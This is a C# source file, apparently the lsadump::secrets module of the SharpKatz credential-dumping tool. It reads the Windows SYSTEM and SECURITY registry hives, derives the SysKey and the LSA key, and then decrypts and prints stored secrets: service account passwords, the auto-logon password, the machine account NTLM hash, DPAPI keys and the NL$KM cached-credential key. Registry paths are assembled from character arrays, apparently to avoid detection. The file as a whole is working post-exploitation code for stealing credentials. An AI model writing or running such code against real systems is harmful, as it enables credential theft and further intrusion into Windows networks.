//
// Author: Johto
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
// Module: lsadump::secrets - LSA Secrets extraction from SECURITY hive
//

using SharpKatz.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static SharpKatz.Win32.Natives;
using static SharpKatz.Module.Sam;

namespace SharpKatz.Module
{
    class LsaSecrets
    {
        const uint KEY_READ = 0x20019;

        // Vista+ LSA policy structure sizes
        const int POL_EKLIST_SALT_LENGTH = 32;
        const int AES256_KEY_LENGTH = 32;

        // LSA Policy revision
        const uint POL_REVISION_AES256_SHA256 = 0x00000100; // Vista+

        [StructLayout(LayoutKind.Sequential)]
        public struct POL_REVISION
        {
            public ushort Minor;
            public ushort Major;
        }

        // Vista+ encrypted key list
        [StructLayout(LayoutKind.Sequential)]
        public struct LSADB_POL_EKLIST
        {
            public uint unk0;
            public uint cbKey;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_SECRET_BLOB
        {
            public uint Length;
            public uint unk0;
            public uint unk1;
            public uint unk2;
        }

        /// <summary>
        /// Entry point for lsadump::secrets
        /// Reads SYSTEM + SECURITY hives, extracts and decrypts LSA secrets
        /// </summary>
        public static bool LsadumpSecrets(string systemHive, string securityHive)
        {
            Console.WriteLine("\n  [*] lsadump::secrets");

            SECURITY_ATTRIBUTES nsa = new SECURITY_ATTRIBUTES();

            // Open SYSTEM hive
            IntPtr hDataSystem = CreateFileW(systemHive, (uint)FILE_GENERIC_READ, FILE_SHARE_READ, ref nsa, 3, 0, IntPtr.Zero);
            if (hDataSystem == IntPtr.Zero || hDataSystem == new IntPtr(-1))
            {
                Console.WriteLine("   [-] Error opening SYSTEM hive: {0}", systemHive);
                return false;
            }

            IntPtr hRegistrySystem = Sam.RegistryOpen(KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, false);
            if (hRegistrySystem == IntPtr.Zero)
            {
                Console.WriteLine("   [-] Error RegistryOpen SYSTEM hive");
                CloseHandle(hDataSystem);
                return false;
            }

            // Get syskey from SYSTEM hive
            IntPtr sysKey = Sam.GetComputerAndSyskey(hRegistrySystem, IntPtr.Zero);
            if (sysKey == IntPtr.Zero)
            {
                Console.WriteLine("   [-] Error retrieving SysKey");
                Sam.RegistryClose(hRegistrySystem);
                CloseHandle(hDataSystem);
                return false;
            }

            byte[] sysKeyBytes = new byte[16];
            Marshal.Copy(sysKey, sysKeyBytes, 0, 16);

            // Open SECURITY hive
            IntPtr hDataSecurity = CreateFileW(securityHive, (uint)FILE_GENERIC_READ, FILE_SHARE_READ, ref nsa, 3, 0, IntPtr.Zero);
            if (hDataSecurity == IntPtr.Zero || hDataSecurity == new IntPtr(-1))
            {
                Console.WriteLine("   [-] Error opening SECURITY hive: {0}", securityHive);
                Sam.RegistryClose(hRegistrySystem);
                CloseHandle(hDataSystem);
                return false;
            }

            IntPtr hRegistrySecurity = Sam.RegistryOpen(KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE, hDataSecurity, false);
            if (hRegistrySecurity == IntPtr.Zero)
            {
                Console.WriteLine("   [-] Error RegistryOpen SECURITY hive");
                CloseHandle(hDataSecurity);
                Sam.RegistryClose(hRegistrySystem);
                CloseHandle(hDataSystem);
                return false;
            }

            // Extract LSA key from SECURITY\Policy\PolEKList (Vista+)
            // or SECURITY\Policy\PolSecretEncryptionKey (XP)
            byte[] lsaKey = GetLsaKeyFromSecurityHive(hRegistrySecurity, sysKeyBytes);
            if (lsaKey == null || lsaKey.Length == 0)
            {
                Console.WriteLine("   [-] Error extracting LSA key");
                Sam.RegistryClose(hRegistrySecurity);
                CloseHandle(hDataSecurity);
                Sam.RegistryClose(hRegistrySystem);
                CloseHandle(hDataSystem);
                return false;
            }

            Console.Write("   LSA Key : ");
            Console.WriteLine(Utility.PrintHashBytes(lsaKey));

            // Enumerate and decrypt secrets from SECURITY\Policy\Secrets
            EnumerateSecrets(hRegistrySecurity, lsaKey);

            // Cleanup
            Sam.RegistryClose(hRegistrySecurity);
            CloseHandle(hDataSecurity);
            Sam.RegistryClose(hRegistrySystem);
            CloseHandle(hDataSystem);

            return true;
        }

        /// <summary>
        /// Get LSA encryption key from SECURITY hive
        /// Vista+: Policy\PolEKList contains encrypted key list
        /// Algorithm: SHA-256(SysKey || EncryptedBlob.Salt[0:32] * 1000) -> AES-256 ECB decrypt
        /// </summary>
        private static byte[] GetLsaKeyFromSecurityHive(IntPtr hRegistry, byte[] sysKey)
        {
            uint lpType = 0;
            IntPtr lpData = IntPtr.Zero;
            uint szNeeded = 0;

            // Try Vista+ path first: Policy\PolEKList
            string sPolEKList = new string(new char[] { 'P', 'o', 'l', 'i', 'c', 'y', '\\', 'P', 'o', 'l', 'E', 'K', 'L', 'i', 's', 't' });
            if (Sam.OpenAndQueryWithAlloc(hRegistry, IntPtr.Zero, sPolEKList, null, ref lpType, ref lpData, out szNeeded))
            {
                if (szNeeded > 0 && lpData != IntPtr.Zero)
                {
                    byte[] polEKListData = new byte[szNeeded];
                    Marshal.Copy(lpData, polEKListData, 0, (int)szNeeded);
                    Marshal.FreeHGlobal(lpData);

                    return DecryptPolEKList(polEKListData, sysKey);
                }
            }

            // Fallback: Pre-Vista path Policy\PolSecretEncryptionKey
            string sPolSecretEncryptionKey = new string(new char[] { 'P', 'o', 'l', 'i', 'c', 'y', '\\', 'P', 'o', 'l', 'S', 'e', 'c', 'r', 'e', 't', 'E', 'n', 'c', 'r', 'y', 'p', 't', 'i', 'o', 'n', 'K', 'e', 'y' });
            lpData = IntPtr.Zero;
            szNeeded = 0;
            if (Sam.OpenAndQueryWithAlloc(hRegistry, IntPtr.Zero, sPolSecretEncryptionKey, null, ref lpType, ref lpData, out szNeeded))
            {
                if (szNeeded > 0 && lpData != IntPtr.Zero)
                {
                    byte[] polSecData = new byte[szNeeded];
                    Marshal.Copy(lpData, polSecData, 0, (int)szNeeded);
                    Marshal.FreeHGlobal(lpData);

                    return DecryptPolSecretEncryptionKeyXP(polSecData, sysKey);
                }
            }

            return null;
        }

        /// <summary>
        /// Decrypt Vista+ PolEKList using AES-256 ECB with SHA-256 derived key
        /// Structure: [Salt(32)] [EncryptedData...]
        /// Key derivation: SHA256(SysKey + Salt * 1000)
        /// Then parse the decrypted data to extract the actual LSA key
        /// </summary>
        private static byte[] DecryptPolEKList(byte[] polEKListData, byte[] sysKey)
        {
            // polEKListData layout:
            // [4 bytes version][4 bytes unk][4 bytes unk][4 bytes unk]
            // [32 bytes salt][encrypted data...]
            if (polEKListData.Length < 48)
                return null;

            // Read version
            uint version = BitConverter.ToUInt32(polEKListData, 0);

            // Salt starts at offset 16 (after 4 dwords)
            // Actually the structure from mimikatz is simpler:
            // The raw data from PolEKList is the encrypted blob itself
            // which starts with a header

            byte[] decrypted = DecryptLsaData(polEKListData, sysKey);
            if (decrypted == null || decrypted.Length < 52) // Need at least header + key
                return null;

            // The decrypted PolEKList contains:
            // LSADB_POL_EKLIST header (8 bytes): unk0, cbKey
            // Then repeated key entries
            // Each entry: [GUID(16)] [unk(4)] [unk(4)] [unk(4)] [cbKey(4)] [key(cbKey)]
            int offset = 0;
            uint unk0 = BitConverter.ToUInt32(decrypted, offset); offset += 4;
            uint cbKey = BitConverter.ToUInt32(decrypted, offset); offset += 4;

            // Parse first key entry
            if (offset + 32 > decrypted.Length) return null;

            // GUID (16 bytes)
            offset += 16;
            // unk (4 bytes)
            offset += 4;
            // unk (4 bytes)
            offset += 4;
            // unk (4 bytes)
            offset += 4;
            // cbSecret (4 bytes)
            if (offset + 4 > decrypted.Length) return null;
            uint cbSecret = BitConverter.ToUInt32(decrypted, offset); offset += 4;

            if (cbSecret == 0 || offset + cbSecret > decrypted.Length) return null;

            byte[] lsaKey = new byte[cbSecret];
            Array.Copy(decrypted, offset, lsaKey, 0, (int)cbSecret);

            return lsaKey;
        }

        /// <summary>
        /// Generic LSA data decryption for Vista+
        /// Input format: [version(4)][unk(4)][unk(4)][unk(4)][salt(32)][encrypted(...)]
        /// Key = SHA-256(secret || salt * 1000)
        /// Decrypt = AES-256 ECB block by block
        /// </summary>
        internal static byte[] DecryptLsaData(byte[] encryptedData, byte[] secret)
        {
            if (encryptedData == null || encryptedData.Length < 48)
                return null;

            // Parse header
            uint version = BitConverter.ToUInt32(encryptedData, 0);

            // Only support Vista+ (AES-256 SHA-256)
            // Offset 16: 32-byte salt
            byte[] salt = new byte[32];
            Array.Copy(encryptedData, 16, salt, 0, 32);

            // Encrypted data starts at offset 48
            int encLen = encryptedData.Length - 48;
            if (encLen <= 0)
                return null;

            byte[] encrypted = new byte[encLen];
            Array.Copy(encryptedData, 48, encrypted, 0, encLen);

            // Derive key: SHA-256(secret || salt * 1000)
            byte[] derivedKey = DeriveKeyWithSHA256(secret, salt, 1000);

            // Decrypt using AES-256 ECB
            byte[] decrypted = DecryptAes256Ecb(encrypted, derivedKey);

            return decrypted;
        }

        /// <summary>
        /// SHA-256(secret || salt repeated N times)
        /// </summary>
        private static byte[] DeriveKeyWithSHA256(byte[] secret, byte[] salt, int iterations)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                // Build input: secret + salt * iterations
                byte[] input = new byte[secret.Length + (salt.Length * iterations)];
                Array.Copy(secret, 0, input, 0, secret.Length);
                int offset = secret.Length;
                for (int i = 0; i < iterations; i++)
                {
                    Array.Copy(salt, 0, input, offset, salt.Length);
                    offset += salt.Length;
                }

                return sha256.ComputeHash(input);
            }
        }

        /// <summary>
        /// AES-256 ECB decryption, block by block (16 bytes at a time)
        /// No padding - last partial block is kept as-is
        /// </summary>
        internal static byte[] DecryptAes256Ecb(byte[] encrypted, byte[] key)
        {
            byte[] result = new byte[encrypted.Length];
            int blockSize = 16;

            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.Key = key;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;

                int fullBlocks = encrypted.Length / blockSize;
                int remainder = encrypted.Length % blockSize;

                if (fullBlocks > 0)
                {
                    byte[] fullBlockData = new byte[fullBlocks * blockSize];
                    Array.Copy(encrypted, 0, fullBlockData, 0, fullBlockData.Length);

                    using (ICryptoTransform decryptor = aes.CreateDecryptor())
                    {
                        byte[] decrypted = decryptor.TransformFinalBlock(fullBlockData, 0, fullBlockData.Length);
                        Array.Copy(decrypted, 0, result, 0, decrypted.Length);
                    }
                }

                // Copy remaining bytes as-is (partial block not decrypted)
                if (remainder > 0)
                {
                    Array.Copy(encrypted, fullBlocks * blockSize, result, fullBlocks * blockSize, remainder);
                }
            }

            return result;
        }

        /// <summary>
        /// Pre-Vista LSA key decryption using MD5 + RC4
        /// </summary>
        private static byte[] DecryptPolSecretEncryptionKeyXP(byte[] polSecData, byte[] sysKey)
        {
            // XP format: [header(12)] [encrypted(48)]
            if (polSecData.Length < 60)
                return null;

            byte[] obfKey = new byte[48];
            Array.Copy(polSecData, 12, obfKey, 0, 48);

            // MD5(syskey + obfKey[0..32] * 1000)
            using (MD5 md5 = MD5.Create())
            {
                byte[] input = new byte[sysKey.Length + 32 * 1000];
                Array.Copy(sysKey, 0, input, 0, sysKey.Length);
                int off = sysKey.Length;
                for (int i = 0; i < 1000; i++)
                {
                    Array.Copy(obfKey, 0, input, off, 32);
                    off += 32;
                }
                byte[] md5Key = md5.ComputeHash(input);

                // RC4 decrypt remaining 32 bytes
                byte[] encrypted = new byte[32];
                Array.Copy(obfKey, 16, encrypted, 0, 32);

                IntPtr pEncrypted = Marshal.AllocHGlobal(32);
                Marshal.Copy(encrypted, 0, pEncrypted, 32);

                IntPtr pKey = Marshal.AllocHGlobal(md5Key.Length);
                Marshal.Copy(md5Key, 0, pKey, md5Key.Length);

                CRYPTO_BUFFER dataBuffer = new CRYPTO_BUFFER();
                dataBuffer.Length = 32;
                dataBuffer.MaximumLength = 32;
                dataBuffer.Buffer = pEncrypted;

                CRYPTO_BUFFER keyBuffer = new CRYPTO_BUFFER();
                keyBuffer.Length = (uint)md5Key.Length;
                keyBuffer.MaximumLength = (uint)md5Key.Length;
                keyBuffer.Buffer = pKey;

                RtlEncryptDecryptRC4(ref dataBuffer, ref keyBuffer);

                byte[] decrypted = new byte[32];
                Marshal.Copy(pEncrypted, decrypted, 0, 32);

                Marshal.FreeHGlobal(pEncrypted);
                Marshal.FreeHGlobal(pKey);

                // LSA key is first 16 bytes of decrypted block, starting at offset 16
                byte[] lsaKey = new byte[16];
                Array.Copy(decrypted, 16, lsaKey, 0, 16);

                return lsaKey;
            }
        }

        /// <summary>
        /// Enumerate and decrypt all LSA secrets
        /// </summary>
        private static void EnumerateSecrets(IntPtr hRegistry, byte[] lsaKey)
        {
            string sSecrets = new string(new char[] { 'P', 'o', 'l', 'i', 'c', 'y', '\\', 'S', 'e', 'c', 'r', 'e', 't', 's' });
            IntPtr hSecrets = Sam.RegOpenKeyEx(hRegistry, IntPtr.Zero, sSecrets, 0, (ACCESS_MASK)KEY_READ);
            if (hSecrets == IntPtr.Zero)
            {
                Console.WriteLine("   [-] Cannot open Policy\\Secrets key");
                return;
            }

            // Get number of subkeys
            uint nbSubKeys = 0;
            uint reserved = 0;
            IntPtr pNbSubKeys = Marshal.AllocHGlobal(sizeof(uint));
            IntPtr pMaxSubKeyLen = Marshal.AllocHGlobal(sizeof(uint));

            Sam.RegQueryInfoKey(hRegistry, hSecrets, IntPtr.Zero, IntPtr.Zero, ref reserved,
                pNbSubKeys, pMaxSubKeyLen, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            nbSubKeys = (uint)Marshal.ReadInt32(pNbSubKeys);
            uint maxSubKeyLen = (uint)Marshal.ReadInt32(pMaxSubKeyLen);

            Marshal.FreeHGlobal(pNbSubKeys);
            Marshal.FreeHGlobal(pMaxSubKeyLen);

            if (nbSubKeys == 0)
            {
                Console.WriteLine("   [-] No secrets found");
                Sam.RegCloseKey(hRegistry, hSecrets);
                return;
            }

            Console.WriteLine("\n  [*] Secrets ({0})", nbSubKeys);

            // Enumerate each secret
            for (uint i = 0; i < nbSubKeys; i++)
            {
                uint nameLen = maxSubKeyLen + 2;
                IntPtr pName = Marshal.AllocHGlobal((int)(nameLen * 2));  // Unicode
                IntPtr pNameLen = Marshal.AllocHGlobal(sizeof(uint));
                Marshal.WriteInt32(pNameLen, (int)nameLen);

                if (Sam.RegEnumKeyEx(hRegistry, hSecrets, i, pName, pNameLen, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
                {
                    int actualLen = Marshal.ReadInt32(pNameLen);
                    string secretName = Marshal.PtrToStringUni(pName, actualLen);

                    Console.WriteLine("\n  Secret  : {0}", secretName);

                    // Read CurrVal (current value)
                    DecryptAndDisplaySecret(hRegistry, hSecrets, secretName, "CurrVal", lsaKey);

                    // Read OldVal (old value)
                    DecryptAndDisplaySecret(hRegistry, hSecrets, secretName, "OldVal", lsaKey);
                }

                Marshal.FreeHGlobal(pName);
                Marshal.FreeHGlobal(pNameLen);
            }

            Sam.RegCloseKey(hRegistry, hSecrets);
        }

        /// <summary>
        /// Decrypt and display a single secret value
        /// </summary>
        private static void DecryptAndDisplaySecret(IntPtr hRegistry, IntPtr hSecrets, string secretName, string valueName, byte[] lsaKey)
        {
            uint lpType = 0;
            IntPtr lpData = IntPtr.Zero;
            uint szNeeded = 0;

            string subKeyPath = secretName + "\\" + valueName;

            if (Sam.OpenAndQueryWithAlloc(hRegistry, hSecrets, subKeyPath, null, ref lpType, ref lpData, out szNeeded))
            {
                if (szNeeded > 0 && lpData != IntPtr.Zero)
                {
                    byte[] encryptedData = new byte[szNeeded];
                    Marshal.Copy(lpData, encryptedData, 0, (int)szNeeded);
                    Marshal.FreeHGlobal(lpData);

                    byte[] decrypted = DecryptLsaData(encryptedData, lsaKey);
                    if (decrypted != null && decrypted.Length > 0)
                    {
                        // Parse LSA_SECRET_BLOB header
                        if (decrypted.Length >= 16)
                        {
                            uint secretLen = BitConverter.ToUInt32(decrypted, 0);

                            Console.Write("   {0} : ", valueName);

                            if (secretLen > 0 && secretLen + 16 <= decrypted.Length)
                            {
                                byte[] secretData = new byte[secretLen];
                                Array.Copy(decrypted, 16, secretData, 0, (int)secretLen);

                                DisplaySecretData(secretName, secretData);
                            }
                            else
                            {
                                Console.WriteLine("(empty)");
                            }
                        }
                        else
                        {
                            Console.Write("   {0} : ", valueName);
                            Console.WriteLine(Utility.PrintHexBytes(decrypted));
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Display secret data with context-aware formatting
        /// $MACHINE.ACC -> machine account password (NTLM hash)
        /// DPAPI_SYSTEM -> DPAPI master key backup keys
        /// DefaultPassword -> auto-logon password (plaintext unicode)
        /// NL$KM -> cached credentials encryption key (used by LsaCache)
        /// _SC_* -> service account passwords
        /// </summary>
        private static void DisplaySecretData(string secretName, byte[] data)
        {
            if (secretName.StartsWith("_SC_"))
            {
                // Service account password (unicode string)
                string password = Encoding.Unicode.GetString(data).TrimEnd('\0');
                Console.WriteLine(password);
            }
            else if (secretName.Equals("$MACHINE.ACC", StringComparison.OrdinalIgnoreCase))
            {
                // Machine account password - show NTLM hash
                Console.WriteLine();
                Console.Write("     NTLM : ");
                using (MD4Managed md4 = new MD4Managed())
                {
                    byte[] ntlm = md4.ComputeHash(data);
                    Console.WriteLine(Utility.PrintHashBytes(ntlm));
                }
                Console.Write("     Raw  : ");
                if (data.Length > 64)
                {
                    byte[] truncated = new byte[64];
                    Array.Copy(data, 0, truncated, 0, 64);
                    Console.WriteLine(Utility.PrintHexBytes(truncated) + "...");
                }
                else
                {
                    Console.WriteLine(Utility.PrintHexBytes(data));
                }
            }
            else if (secretName.Equals("DPAPI_SYSTEM", StringComparison.OrdinalIgnoreCase))
            {
                // DPAPI backup keys
                if (data.Length >= 44)
                {
                    Console.WriteLine();
                    byte[] machineKey = new byte[20];
                    byte[] userKey = new byte[20];
                    Array.Copy(data, 4, machineKey, 0, 20);
                    Array.Copy(data, 24, userKey, 0, 20);
                    Console.WriteLine("     Machine key : {0}", Utility.PrintHashBytes(machineKey));
                    Console.WriteLine("     User key    : {0}", Utility.PrintHashBytes(userKey));
                }
                else
                {
                    Console.WriteLine(Utility.PrintHexBytes(data));
                }
            }
            else if (secretName.Equals("NL$KM", StringComparison.OrdinalIgnoreCase))
            {
                // NL$KM key used for cached domain credentials
                Console.WriteLine(Utility.PrintHexBytes(data));
            }
            else if (secretName.Equals("DefaultPassword", StringComparison.OrdinalIgnoreCase))
            {
                // Auto-logon password
                string password = Encoding.Unicode.GetString(data).TrimEnd('\0');
                Console.WriteLine(password);
            }
            else
            {
                // Unknown secret - hex dump
                Console.WriteLine(Utility.PrintHexBytes(data));
            }
        }

        /// <summary>
        /// Simple MD4 implementation for NTLM hash of machine account password
        /// </summary>
        internal class MD4Managed : HashAlgorithm
        {
            private uint[] state;
            private byte[] buffer;
            private long count;

            public MD4Managed()
            {
                HashSizeValue = 128;
                state = new uint[4];
                buffer = new byte[64];
                Initialize();
            }

            public override void Initialize()
            {
                count = 0;
                state[0] = 0x67452301;
                state[1] = 0xefcdab89;
                state[2] = 0x98badcfe;
                state[3] = 0x10325476;
                Array.Clear(buffer, 0, buffer.Length);
            }

            protected override void HashCore(byte[] array, int ibStart, int cbSize)
            {
                int index = (int)(count & 0x3F);
                count += cbSize;

                int i = 0;
                if (index > 0)
                {
                    int partLen = 64 - index;
                    if (cbSize >= partLen)
                    {
                        Array.Copy(array, ibStart, buffer, index, partLen);
                        Transform(buffer, 0);
                        i = partLen;
                    }
                    else
                    {
                        Array.Copy(array, ibStart, buffer, index, cbSize);
                        return;
                    }
                }

                for (; i + 63 < cbSize; i += 64)
                    Transform(array, ibStart + i);

                if (i < cbSize)
                    Array.Copy(array, ibStart + i, buffer, 0, cbSize - i);
            }

            protected override byte[] HashFinal()
            {
                byte[] bits = BitConverter.GetBytes(count * 8);
                int index = (int)(count & 0x3F);
                int padLen = (index < 56) ? (56 - index) : (120 - index);
                byte[] padding = new byte[padLen];
                padding[0] = 0x80;
                HashCore(padding, 0, padLen);
                HashCore(bits, 0, 8);

                byte[] hash = new byte[16];
                for (int i = 0; i < 4; i++)
                {
                    byte[] tmp = BitConverter.GetBytes(state[i]);
                    Array.Copy(tmp, 0, hash, i * 4, 4);
                }

                Initialize();
                return hash;
            }

            private void Transform(byte[] block, int offset)
            {
                uint a = state[0], b = state[1], c = state[2], d = state[3];
                uint[] x = new uint[16];
                for (int i = 0; i < 16; i++)
                    x[i] = BitConverter.ToUInt32(block, offset + i * 4);

                // Round 1
                a = FF(a, b, c, d, x[0], 3);  d = FF(d, a, b, c, x[1], 7);
                c = FF(c, d, a, b, x[2], 11); b = FF(b, c, d, a, x[3], 19);
                a = FF(a, b, c, d, x[4], 3);  d = FF(d, a, b, c, x[5], 7);
                c = FF(c, d, a, b, x[6], 11); b = FF(b, c, d, a, x[7], 19);
                a = FF(a, b, c, d, x[8], 3);  d = FF(d, a, b, c, x[9], 7);
                c = FF(c, d, a, b, x[10], 11); b = FF(b, c, d, a, x[11], 19);
                a = FF(a, b, c, d, x[12], 3); d = FF(d, a, b, c, x[13], 7);
                c = FF(c, d, a, b, x[14], 11); b = FF(b, c, d, a, x[15], 19);

                // Round 2
                a = GG(a, b, c, d, x[0], 3);  d = GG(d, a, b, c, x[4], 5);
                c = GG(c, d, a, b, x[8], 9);  b = GG(b, c, d, a, x[12], 13);
                a = GG(a, b, c, d, x[1], 3);  d = GG(d, a, b, c, x[5], 5);
                c = GG(c, d, a, b, x[9], 9);  b = GG(b, c, d, a, x[13], 13);
                a = GG(a, b, c, d, x[2], 3);  d = GG(d, a, b, c, x[6], 5);
                c = GG(c, d, a, b, x[10], 9); b = GG(b, c, d, a, x[14], 13);
                a = GG(a, b, c, d, x[3], 3);  d = GG(d, a, b, c, x[7], 5);
                c = GG(c, d, a, b, x[11], 9); b = GG(b, c, d, a, x[15], 13);

                // Round 3
                a = HH(a, b, c, d, x[0], 3);  d = HH(d, a, b, c, x[8], 9);
                c = HH(c, d, a, b, x[4], 11); b = HH(b, c, d, a, x[12], 15);
                a = HH(a, b, c, d, x[2], 3);  d = HH(d, a, b, c, x[10], 9);
                c = HH(c, d, a, b, x[6], 11); b = HH(b, c, d, a, x[14], 15);
                a = HH(a, b, c, d, x[1], 3);  d = HH(d, a, b, c, x[9], 9);
                c = HH(c, d, a, b, x[5], 11); b = HH(b, c, d, a, x[13], 15);
                a = HH(a, b, c, d, x[3], 3);  d = HH(d, a, b, c, x[11], 9);
                c = HH(c, d, a, b, x[7], 11); b = HH(b, c, d, a, x[15], 15);

                state[0] += a; state[1] += b; state[2] += c; state[3] += d;
            }

            private static uint RotateLeft(uint x, int n) => (x << n) | (x >> (32 - n));
            private static uint F(uint x, uint y, uint z) => (x & y) | (~x & z);
            private static uint G(uint x, uint y, uint z) => (x & y) | (x & z) | (y & z);
            private static uint H(uint x, uint y, uint z) => x ^ y ^ z;

            private static uint FF(uint a, uint b, uint c, uint d, uint x, int s)
                => RotateLeft(a + F(b, c, d) + x, s);
            private static uint GG(uint a, uint b, uint c, uint d, uint x, int s)
                => RotateLeft(a + G(b, c, d) + x + 0x5A827999, s);
            private static uint HH(uint a, uint b, uint c, uint d, uint x, int s)
                => RotateLeft(a + H(b, c, d) + x + 0x6ED9EBA1, s);
        }

        /// <summary>
        /// Extract NL$KM key from LSA secrets for use by LsaCache module
        /// </summary>
        internal static byte[] GetNLKMKey(IntPtr hRegistry, byte[] lsaKey)
        {
            uint lpType = 0;
            IntPtr lpData = IntPtr.Zero;
            uint szNeeded = 0;

            string sNLKM = new string(new char[] { 'P', 'o', 'l', 'i', 'c', 'y', '\\', 'S', 'e', 'c', 'r', 'e', 't', 's', '\\', 'N', 'L', '$', 'K', 'M', '\\', 'C', 'u', 'r', 'r', 'V', 'a', 'l' });

            if (Sam.OpenAndQueryWithAlloc(hRegistry, IntPtr.Zero, sNLKM, null, ref lpType, ref lpData, out szNeeded))
            {
                if (szNeeded > 0 && lpData != IntPtr.Zero)
                {
                    byte[] encryptedData = new byte[szNeeded];
                    Marshal.Copy(lpData, encryptedData, 0, (int)szNeeded);
                    Marshal.FreeHGlobal(lpData);

                    byte[] decrypted = DecryptLsaData(encryptedData, lsaKey);
                    if (decrypted != null && decrypted.Length >= 16)
                    {
                        // Parse LSA_SECRET_BLOB
                        uint secretLen = BitConverter.ToUInt32(decrypted, 0);
                        if (secretLen > 0 && secretLen + 16 <= decrypted.Length)
                        {
                            byte[] nlkmKey = new byte[secretLen];
                            Array.Copy(decrypted, 16, nlkmKey, 0, (int)secretLen);
                            return nlkmKey;
                        }
                    }
                }
            }

            return null;
        }

        /// <summary>
        /// Get LSA key from SECURITY hive (for use by LsaCache)
        /// </summary>
        internal static byte[] GetLsaKey(string systemHive, string securityHive, out IntPtr hRegistrySecurity, out IntPtr hDataSecurity)
        {
            hRegistrySecurity = IntPtr.Zero;
            hDataSecurity = IntPtr.Zero;

            SECURITY_ATTRIBUTES nsa = new SECURITY_ATTRIBUTES();

            // Open SYSTEM hive
            IntPtr hDataSystem = CreateFileW(systemHive, (uint)FILE_GENERIC_READ, FILE_SHARE_READ, ref nsa, 3, 0, IntPtr.Zero);
            if (hDataSystem == IntPtr.Zero || hDataSystem == new IntPtr(-1))
                return null;

            IntPtr hRegistrySystem = Sam.RegistryOpen(KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, false);
            if (hRegistrySystem == IntPtr.Zero)
            {
                CloseHandle(hDataSystem);
                return null;
            }

            IntPtr sysKey = Sam.GetComputerAndSyskey(hRegistrySystem, IntPtr.Zero);
            if (sysKey == IntPtr.Zero)
            {
                Sam.RegistryClose(hRegistrySystem);
                CloseHandle(hDataSystem);
                return null;
            }

            byte[] sysKeyBytes = new byte[16];
            Marshal.Copy(sysKey, sysKeyBytes, 0, 16);

            Sam.RegistryClose(hRegistrySystem);
            CloseHandle(hDataSystem);

            // Open SECURITY hive
            hDataSecurity = CreateFileW(securityHive, (uint)FILE_GENERIC_READ, FILE_SHARE_READ, ref nsa, 3, 0, IntPtr.Zero);
            if (hDataSecurity == IntPtr.Zero || hDataSecurity == new IntPtr(-1))
                return null;

            hRegistrySecurity = Sam.RegistryOpen(KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE, hDataSecurity, false);
            if (hRegistrySecurity == IntPtr.Zero)
            {
                CloseHandle(hDataSecurity);
                return null;
            }

            return GetLsaKeyFromSecurityHive(hRegistrySecurity, sysKeyBytes);
        }
    }
}
